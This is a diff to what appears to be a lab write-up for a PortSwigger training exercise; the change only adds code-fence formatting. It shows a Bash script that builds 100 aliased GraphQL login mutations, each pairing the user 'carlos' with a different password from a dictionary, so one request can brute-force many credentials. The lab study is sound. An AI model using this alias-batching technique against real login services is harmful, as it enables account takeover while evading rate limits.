@@ -19,6 +19,7 @@ This allows us to send multiple values by assigning a unique identifier to each 
 Our goal is to generate as many aliases as the number of passwords in PortSwigger’s dictionary.
 We achieve this using the following Bash script:
 
+```bash
 #!/bin/bash 
 text='''
 alias_x: login(input: {username: "carlos", password: "BRUTE-FORCE"}) {\n
@@ -32,8 +33,9 @@ cat pass-bscp.txt | while read i; do
   echo -e $text | sed "s/test/$i/" | sed "s/alias_x/alias_$count/"
   let count+=1
 done
-
+```
 
 The output of this script will be 100 aliases, each with its own unique identifier and a different password value:
+
 
 ![Screenshot5](../../04-Screenshots/alias5.png)
